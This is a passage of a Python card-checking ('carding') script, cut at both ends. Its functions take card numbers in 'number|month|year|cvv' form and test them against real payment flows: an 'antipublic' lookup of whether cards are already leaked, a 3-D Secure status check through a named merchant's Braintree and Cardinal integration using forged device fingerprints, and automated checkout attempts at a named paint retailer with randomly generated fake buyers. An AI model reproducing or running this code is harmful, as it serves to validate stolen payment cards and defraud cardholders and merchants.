ZSwicHJvZHVjdF9pZCI6ODU2MDU3MDE3MTY5OCwicHJvZHVjdF9oYXNfb25seV9kZWZhdWx0X3ZhcmlhbnQiOmZhbHNlLCJnaWZ0X2NhcmQiOmZhbHNlLCJmaW5hbF9wcmljZSI6MTYwMCwiZmluYWxfbGluZV9wcmljZSI6MTYwMCwidXJsIjoiXC9wcm9kdWN0c1wvYWNpZGVsaWMtbWljcm9wb2xpc2gtb2lsLWJhc2VkLXdvbWVucy1iYWxtP3ZhcmlhbnQ9NDYxMDAyNDMyMTg3MzgiLCJmZWF0dXJlZF9pbWFnZSI6eyJhc3BlY3RfcmF0aW8iOjEsImFsdCI6IkFjaWRlbGljIE1pY3JvcG9saXNoIiwiaGVpZ2h0IjoxMjAwLCJ1cmwiOiJodHRwczpcL1wvY2RuLnNob3BpZnkuY29tXC9zXC9maWxlc1wvMVwvMDc5OVwvMTc1NFwvNzgyNlwvZmlsZXNcL0FjaWRlbGljTWljcm9wb2xpc2hfV2hpdGVCYWNrZ3JvdW5kXzJvei5qcGc/dj0xNjkxMjkyNzMyIiwid2lkdGgiOjEyMDB9LCJpbWFnZSI6Imh0dHBzOlwvXC9jZG4uc2hvcGlmeS5jb21cL3NcL2ZpbGVzXC8xXC8wNzk5XC8xNzU0XC83ODI2XC9maWxlc1wvQWNpZGVsaWNNaWNyb3BvbGlzaF9XaGl0ZUJhY2tncm91bmRfMm96LmpwZz92PTE2OTEyOTI3MzIiLCJoYW5kbGUiOiJhY2lkZWxpYy1taWNyb3BvbGlzaC1vaWwtYmFzZWQtd29tZW5zLWJhbG0iLCJyZXF1aXJlc19zaGlwcGluZyI6dHJ1ZSwicHJvZHVjdF90eXBlIjoiIiwicHJvZHVjdF90aXRsZSI6IkFjaWRlbGljIE1pY3JvcG9saXNoIiwicHJvZHVjdF9kZXNjcmlwdGlvbiI6IlNtb290aCBhcyBhIGJhYnlcdTIwMTlzIGJ1bSFcbkFjaWRlbGljIE1pY3JvcG9saXNoIHdvcmtzIGRvdWJsZS10aW1lIHRvIGV4Zm9saWF0ZSBza2luIHdpdGggYSBwaHlzaWNhbCBwb2xpc2ggZnJvbSBTdXBlcmZydWl0IFNlZWRzIGFuZCBhIG5hdHVyYWwgQWxwaGEgSHlkcm94eSBBY2lkIGNvbXBsZXggdGhhdCBleGZvbGlhdGVzIHNraW4gZ2VudGx5IGFuZCBlZmZlY3RpdmVseS4gVGhpcyBzY3J1YiBpcyBhIG5vbi1pcnJpdGF0aW5nIG9pbC1iYXNlZCBiYWxtIHRoYXQgaXMgcmluc2VzIGNsZWFuLCBpcyBub24tZHJ5aW5nLCBhbmQgaXMgc2FmZSBmb3Igc2Vuc2l0aXZlIHNraW4uXG5XaGF0IGl0IGRvZXNcblxuVmlzaWJseSBicmlnaHRlbnMgc2tpblxuU29mdGVucyBhbmQgaW1wcm92ZXMgc2tpbiB0ZXh0dXJlXG5Qb2xpc2hlcyBcLyBleGZvbGlhdGVzIHNraW4gZm9yIGEgZ2xvd2luZyBmaW5pc2hcbkRlZXAgY2xlYW5zIGFuZCBoZWxwcyBza2luIGNsYXJpdHlcblxuS2V5IEluZ3JlZGllbnRzIHRoYXQgd29yayB3aXRoIHlvdXIgc2tpblxuQmx1ZWJlcnJ5IGFuZCBQb21lZ3JhbmF0ZSBTZWVkcywgQmlsYmVycnkgRXh0cmFjdCwgU3VnYXIgQ2FuZSwgQ0JEICsgQ0JHIiwidmFyaWFudF90aXRsZSI6Ik1pbmkgMC41b3ogLSAkMTYuMDAiLCJ2YXJpYW50X29wdGlvbnMiOlsiTWluaSAwLjVveiAtICQxNi4wMCJdLCJvcHRpb25zX3dpdGhfdmFsdWVzIjpbeyJuYW1lIjoiU2l6ZSIsInZhbHVlIjoiTWluaSAwLjVveiAtICQxNi4wMCJ9XSwibGluZV9sZXZlbF9kaXNjb3VudF9hbGxvY2F0aW9ucyI6W10sImxpbmVfbGV2ZWxfdG90YWxfZGlzY291bnQiOjAsImhhc19jb21wb25lbnRzIjpmYWxzZSwic3F1YXJlX2Rpc2NvdW50IjpbXSwic3Vic2NyaXB0aW9uX2Rpc2NvdW50IjpbXX1dLCJyZXF1aXJlc19zaGlwcGluZyI6dHJ1ZSwiY3VycmVuY3kiOiJVU0QiLCJpdGVtc19zdWJ0b3RhbF9wcmljZSI6MTYwMCwiY2FydF9sZXZlbF9kaXNjb3VudF9hcHBsaWNhdGlvbnMiOltdfQ==',
	    'shipping_lines': '{"id":"shopify-Economy-8.00","title":"Economy","price":"8.00","code":"Economy","source":"shopify"}',
	    'sms_multi_shipping_lines': '',
	    'sms_multi_tax_lines': '',
	    'tax_lines': '[{"title":"New York State Tax","price":0,"rate":0}]',
	    'processCheckout': '1',
	    'ac_token': '',
	    'shop_currency_name': 'USD',
	    'shop_currency_symbol': '$',
	    'checkout_id': 'Z2lkOi8vc2hvcGlmeS9DaGVja291dC85MDA1ZjhmNDlkY2I5NmEzYzU1NTU4ZTZlNmYyOGU0MD9rZXk9NTIzNzQzMjNiMTc2MjdmY2NkNGFiODZlZTIzYzk2Y2M=',
	    'nonce': id,
	}
	
	response = requests.post('https://phpstack-1046663-3864545.cloudwaysapps.com//controller.php', headers=headers, data=data)
	try:
		res=(response.json()['message'].split(':')[1].split('<')[0].replace("'",""))
	except:
		res=(response.json()['message'])
	return res
def pv(ccx):
	import requests
	ccx=ccx.split('|')[0]
	cards = [f"{ccx}"]
	response = requests.post(
	    "https://api.antipublic.cc/cards",
	    json=cards
	).json()
	try:
		i=(response['private'][0])
		return 'private'
	except:
		i=(response['public'][0])
		return 'public'		
def vbv(ccx):
	import requests,re,base64,jwt,json
	cc=ccx
	def get_ref():
		with open('gates.json', 'r') as file:
			json_dataa = json.load(file)
		cookies = {
		    'PHPSESSID': 'ebd4715f9d785f07f144f5d8c841badc'
		}
		headers = {
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		response = requests.get('https://www.sportfish.co.uk/checkout/', cookies=cookies, headers=headers)
		no=re.findall(r'"clientToken":"(.*?)"',response.text)[0]
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
		    'operationName': 'ClientConfiguration',
		}
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
		headers = {
		    'authority': 'centinelapi.cardinalcommerce.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json;charset=UTF-8',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'x-cardinal-tid': 'Tid-254fb674-0925-4e3e-9afa-fa4d4326757d',
		}
		json_data = {
		    'BrowserPayload': {
		        'Order': {
		            'OrderDetails': {},
		            'Consumer': {
		                'BillingAddress': {},
		                'ShippingAddress': {},
		                'Account': {},
		            },
		            'Cart': [],
		            'Token': {},
		            'Authorization': {},
		            'Options': {},
		            'CCAExtension': {},
		        },
		        'SupportsAlternativePayments': {
		            'cca': True,
		            'hostedFields': False,
		            'applepay': False,
		            'discoverwallet': False,
		            'wallet': False,
		            'paypal': False,
		            'visacheckout': False,
		        },
		    },
		    'Client': {
		        'Agent': 'SongbirdJS',
		        'Version': '1.35.0',
		    },
		    'ConsumerSessionId': None,
		    'ServerJWT': cardnal,
		}
		response = requests.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
		payload = response.json()['CardinalJWT']
		payload_dict = jwt.decode(payload, options={"verify_signature": False})
		ref = payload_dict['ReferenceId']
		json_dataa['up']['re']=ref
		json_dataa['up']['au']=au
		with open('gates.json', 'w') as json_file:
			json.dump(json_dataa, json_file, ensure_ascii=False, indent=4)
		headers = {
		    'authority': 'geo.cardinalcommerce.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json',
		    'origin': 'https://geo.cardinalcommerce.com',
		    'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5f45accd4c6a414cafc1ae4e&tmEventType=PAYMENT&referenceId={ref}&geolocation=false&origin=Songbird',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
		json_data = {
		    'Cookies': {
		        'Legacy': True,
		        'LocalStorage': True,
		        'SessionStorage': True,
		    },
		    'DeviceChannel': 'Browser',
		    'Extended': {
		        'Browser': {
		            'Adblock': True,
		            'AvailableJsFonts': [],
		            'DoNotTrack': 'unknown',
		            'JavaEnabled': False,
		        },
		        'Device': {
		            'ColorDepth': 24,
		            'Cpu': 'unknown',
		            'Platform': 'Linux armv81',
		            'TouchSupport': {
		                'MaxTouchPoints': 5,
		                'OnTouchStartAvailable': True,
		                'TouchEventCreationSuccessful': True,
		            },
		        },
		    },
		    'Fingerprint': '4291e9424912bfb097796e676a43a259',
		    'FingerprintingTime': 1249,
		    'FingerprintDetails': {
		        'Version': '1.5.1',
		    },
		    'Language': 'en-US',
		    'Latitude': None,
		    'Longitude': None,
		    'OrgUnitId': '5f45accd4c6a414cafc1ae4e',
		    'Origin': 'Songbird',
		    'Plugins': [],
		    'ReferenceId': ref,
		    'Referrer': 'https://www.sportfish.co.uk/',
		    'Screen': {
		        'FakedResolution': False,
		        'Ratio': 2.2213740458015265,
		        'Resolution': '873x393',
		        'UsableResolution': '873x393',
		        'CCAScreenSize': '02',
		    },
		    'CallSignEnabled': None,
		    'ThreatMetrixEnabled': False,
		    'ThreatMetrixEventType': 'PAYMENT',
		    'ThreatMetrixAlias': 'Default',
		    'TimeOffset': -120,
		    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'UserAgentDetails': {
		        'FakedOS': False,
		        'FakedBrowser': False,
		    },
		    'BinSessionId': 'add5c63e-e8fb-4e9c-a235-b13f64a74f69',
		}
		response = requests.post(
		    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
		    headers=headers,
		    json=json_data,
		)
		hi=result(cc)
		return hi
	def result(cc):
		n=cc.split('|')[0]
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		au=(json_data['up']['au'])
		ref=(json_data['up']['re'])
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://assets.braintreegateway.com',
		    'referer': 'https://assets.braintreegateway.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': '12',
		                'expirationYear': '2029',
		                'cvv': '982',
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		try:
			tok = response.json()['data']['tokenizeCreditCard']['token']
		except:
			get_ref()
		headers = {
		    'authority': 'api.braintreegateway.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'amount': '29.99',
		    'additionalInfo': {
		        'billingLine1': '10 Sillerton House',
		        'billingLine2': '16 Albyn Terrace',
		        'billingCity': 'Aberdeen',
		        'billingState': '',
		        'billingPostalCode': 'AB10 1YP',
		        'billingCountryCode': 'US',
		        'billingPhoneNumber': '9108749652',
		        'billingGivenName': '\\u006a\\u0061\\u0063\\u006b\\u0073\\u006f\\u006e',
		        'billingSurname': '\\u004d\\u0061\\u0067\\u0065\\u006e\\u0074\\u006f',
		    },
		    'challengeRequested': True,
		    'bin': '493452',
		    'dfReferenceId': ref,
		    'clientMetadata': {
		        'requestedThreeDSecureVersion': '2',
		        'sdkVersion': 'web/3.94.0',
		        'cardinalDeviceDataCollectionTimeElapsed': 560,
		        'issuerDeviceDataCollectionTimeElapsed': 669,
		        'issuerDeviceDataCollectionResult': True,
		    },
		    'authorizationFingerprint': au,
		    'braintreeLibraryVersion': 'braintree/web/3.94.0',
		    '_meta': {
		        'merchantAppId': 'www.sportfish.co.uk',
		        'platform': 'web',
		        'sdkVersion': '3.94.0',
		        'source': 'client',
		        'integration': 'custom',
		        'integrationType': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		}
		response = requests.post(
		    f'https://api.braintreegateway.com/merchants/fs8wxy78pkvx72rh/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
		    headers=headers,
		    json=json_data,
		)
		try:
			string=response.json()['paymentMethod']['threeDSecureInfo']['status']
		except:
			return 'Error'
		formatted_string = string.replace("_", " ").title()
		otp=(formatted_string)
		if 'Successful' in otp or 'Unavailable' in  otp or 'successful' in otp:
			return otp+' â'
		else:
			return otp+' â'
	return result(cc)
def br(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests,re,base64
	name = ''.join(random.choices(string.ascii_lowercase, k=20))
	number = ''.join(random.choices(string.digits, k=4))
	em=f"{name}{number}@gmail.com"
	name = ''.join(random.choices(string.ascii_lowercase, k=10))
	number = ''.join(random.choices(string.digits, k=2))
	bill=f"{number}{name}"
	namek = ''.join(random.choices(string.ascii_lowercase, k=6))
	first = namek
	last = name
	numbers_and_zips = {
        3606: "10080",
        3558: "10071",
        3534: "10012",
        3577: "10011",
        3573: "10044",
        3607: "70012",
        3568: "33321"
    }
	number = random.choice(list(numbers_and_zips.keys()))
	zip_code = numbers_and_zips[number]
	letters_and_digits = string.ascii_letters + string.digits
	number = ''.join(random.choices(string.digits, k=7))
	ua = UserAgent()
	user = ua.random
	def up():
		r = requests.session()
		headers={
		'User-Agent': user
		}
		response = r.get('https://www.paintsupply.com', headers=headers)
		from requests_toolbelt.multipart.encoder import MultipartEncoder
		headers = {
		    'User-Agent': user,
		}
		
		files = {
		    'quantity': (None, '1'),
		    'product_price': (None, '5.59'),
		    'product_weight': (None, '1.000'),
		    'sfm_logic_onoff': (None, 'off'),
		    'modal_hide_show': (None, '240'),
		    'sfm_value': (None, '240'),
		    'sfm_type': (None, 'cases'),
		    'cart_old_qty': (None, ''),
		    'check_sfm_on_off_for_modal': (None, '0'),
		    'add-to-cart': (None, '30856'),
		    'gtm4wp_id': (None, '30856'),
		    'gtm4wp_internal_id': (None, '30856'),
		    'gtm4wp_name': (None, '16 Oz Seymour Of Sycamore 16-3395 Solvent-Based Spray Match Custom Can'),
		    'gtm4wp_sku': (None, '155944'),
		    'gtm4wp_category': (None, 'Empty Aerosol Cans'),
		    'gtm4wp_price': (None, '5.59'),
		    'gtm4wp_stocklevel': (None, '568'),
		    'gtm4wp_brand': (None, 'Seymour Of Sycamore'),
		}
		multipart_data = MultipartEncoder(files)
		headers['Content-Type'] = multipart_data.content_type
		response = r.post(
		    'https://www.paintsupply.com/product/spray-paint/aerosol-empty-cans/16-oz-seymour-16-3395-blank-seymore-solvent-based-empty-spray-can/',
		    cookies=r.cookies,
		    headers=headers,
		    data=multipart_data
		)
		response = r.get('https://www.paintsupply.com/cart/', cookies=r.cookies, headers=headers)
		response = r.get('https://www.paintsupply.com/checkout', cookies=r.cookies, headers=headers)
		print(response.text)
		nonce=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
		CartRebuildKey=re.findall(r'"CartRebuildKey":"(.*?)"',response.text)[0]
		from bs4 import BeautifulSoup
		soup = BeautifulSoup(response.text, 'html.parser')
		wpnonce_input = soup.find('input', id='_wpnonce')
		wpnonce_value = wpnonce_input['value']
		headers = {
		    'Accept': '*/*',
		    'Accept-Language': 'en-US,en;q=0.9',
		    'Connection': 'keep-alive',
		    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    'Origin': 'https://www.paintsupply.com',
		    'Referer': 'https://www.paintsupply.com/checkout',
		    'Sec-Fetch-Dest': 'empty',
		    'Sec-Fetch-Mode': 'cors',
		    'Sec-Fetch-Site': 'same-origin',
		    'User-Agent': user,
		    'X-Requested-With': 'XMLHttpRequest',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		}
		
		data = {
		    'action': 'wc_braintree_credit_card_get_client_token',
		    'nonce': nonce,
		}
		
		response = r.post('https://www.paintsupply.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
		no=response.json()['data']
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		import pickle
		with open('cookies.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
					'na' : {
		  "nonce": wpnonce_value,
		  "au": au
					}
				}
		
		existing_data.update(new_data)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	try:
		wpnonce_value=json_data['na']['nonce']
		au=json_data['na']['au']
		r = requests.session()
		import pickle
		import http.cookiejar
		with open('cookies.pkl', 'rb') as f:
			cookies = pickle.load(f)
		r = requests.session()
		r.cookies = cookies
	except Exception as e:
		up()
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '0d3d244a-e386-42db-a3cf-c53dbfa59661',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		up()
		return 'Declined'
	
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': 'pbid=c624700819dcfee6b90da559faf2fa7574c4a24dfd7c328abfb5b52450bae868; AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; pys_session_limit=true; pys_start_session=true; nf23510_services_exp=956-475-150; _gcl_au=1.1.642801807.1714503977; __mmapiwsid=018f3066-87b2-753d-9c13-d4fd5d0ad299:f647beef5fde452d645193df227ee98298625cfe; dicbo_id=%7B%22dicbo_fetch%22%3A1714503977896%7D; _gid=GA1.2.190847686.1714503978; BVBRANDID=b637cd6b-8839-44e9-b3d9-e809816e1bbb; BVBRANDSID=f2314ea8-2470-477f-b233-f638664bd3d1; _fbp=fb.1.1714503978899.1306199105; wp-wpml_current_language=en; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.paintsupply.com/; __qca=P0-562375610-1714503985860; PHPSESSID=va9arj9imrer78l037o112146n; shoppingfeeder=51779114c5106389; ctm_data=%5B%7B%22product_id%22%3A30856%2C%22manufacturer_id%22%3A168%2C%22minimun_req_type%22%3A%22cases%22%2C%22minimum_req_value%22%3A%22240%22%2C%22sfm_available%22%3A%22yes%22%7D%5D; woocommerce_items_in_cart=1; wp_woocommerce_session_8799450e5122eb37f5ddc09d45cc175b=t_44ddb7a3c642b9acb0c6e18aa34413%7C%7C1714676805%7C%7C1714673205%7C%7C4d9f325ad0211b4fb407c74154930e98; _gat_UA-38888967-2=1; _uetsid=b98c0690072411ef874725865fba3a19; _uetvid=b98d0220072411efb5e64b26ee5780e5; _ga=GA1.2.311586249.1714503978; _ga_T78BEZZ2B5=GS1.1.1714503978.1.1.1714504060.44.0.0; _ga_0YNMLT9GX6=GS1.1.1714503978.1.1.1714504060.44.0.0; woocommerce_cart_hash=16d5534ccc2ebf1b97cc1ed97d2d7a93; __kla_id=eyJjaWQiOiJZamt3WWpGbU5UVXRZak00TXkwMFltVTJMV0ZtWTJNdFpUa3hNVE5qTVRGaFlqWXgiLCIkcmVmZXJyZXIiOnsidHMiOjE3MTQ1MDM5NzgsInZhbHVlIjoiaHR0cHM6Ly93d3cucGFpbnRzdXBwbHkuY29tL2NhcnQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnBhaW50c3VwcGx5LmNvbS9jYXJ0LyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxNDUwNDA1NywidmFsdWUiOiJodHRwczovL3d3dy5wYWludHN1cHBseS5jb20vY2FydC8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cucGFpbnRzdXBwbHkuY29tL2NhcnQvIn0sIiRzb3VyY2UiOiJDaGVja291dCBTTVMgT3B0LUluIn0=',
	    'Origin': 'https://www.paintsupply.com',
	    'Referer': 'https://www.paintsupply.com/checkout',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': user,
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'wc-ajax': 'checkout',
	}

	data = {
    'ship_to_different_address': '1',
    'shipping_first_name': first,
    'shipping_last_name': last,
    'shipping_company': '',
    'shipping_country': 'US',
    'shipping_address_1': bill,
    'shipping_address_2': '',
    'shipping_city': 'Huntington',
    'shipping_state': 'NY',
    'shipping_postcode': zip_code,
    'billing_phone': number,
    'billing_email': em,
    'kl_newsletter_checkbox': '1',
    'po_number': '',
    'how_hear_about': '',
    'bill-to-same-address-as-shipping': '1',
    'billing_first_name': 'mska',
    'billing_last_name': 'wj',
    'billing_company': '',
    'billing_country': 'US',
    'billing_address_1': bill,
    'billing_address_2': '',
    'billing_city': 'Huntington',
    'billing_state': 'NY',
    'billing_postcode': zip_code,
    'shipping_method[0]': 'table_rate:2:2',
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '16.93',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'wc_braintree_paypal_device_data': '{"correlation_id":"e07a60acd0e6d078a5b610282087ed58"}',
    'wc_braintree_paypal_payment_nonce': '',
    'wc_braintree_paypal_amount': '16.93',
    'wc_braintree_paypal_currency': 'USD',
    'wc_braintree_paypal_locale': 'en_us',
    'ach_status': '',
    '_wpnonce': wpnonce_value,
    '_wp_http_referer': '/?wc-ajax=update_order_review',
    'pys_utm': 'utm_source:undefined|utm_medium:undefined|utm_campaign:undefined|utm_term:undefined|utm_content:undefined',
    'pys_utm_id': 'fbadid:undefined|gadid:undefined|padid:undefined|bingid:undefined',
    'pys_browser_time': '01-02|Thursday|May',
    'pys_landing': 'https://www.paintsupply.com/product/spray-paint/aerosol-empty-cans/16-oz-seymour-16-3395-blank-seymore-solvent-based-empty-spray-can',
    'pys_source': 'direct',
    'pys_order_type': 'normal',
    'last_pys_landing': 'https://www.paintsupply.com/product/spray-paint/aerosol-empty-cans/16-oz-seymour-16-3395-blank-seymore-solvent-based-empty-spray-can',
    'last_pys_source': 'direct',
    'last_pys_utm': 'utm_source:undefined|utm_medium:undefined|utm_campaign:undefined|utm_term:undefined|utm_content:undefined',
    'last_pys_utm_id': 'fbadid:undefined|gadid:undefined|padid:undefined|bingid:undefined',
}
	
	response = r.post('https://www.paintsupply.com/', params=params, cookies=r.cookies, headers=headers, data=data)
	last=response.text
	if 'CHARGED' in last or 'success' in last or 'Success' in last or 'Your payment has already been processed' in last or 'succeeded' in last or 'success' in last or 'Thank' in last:
		up()
		return 'success'
	elif 'Sorry, your session has expired.' in last:
		up()
		return 'Declined'
	try:
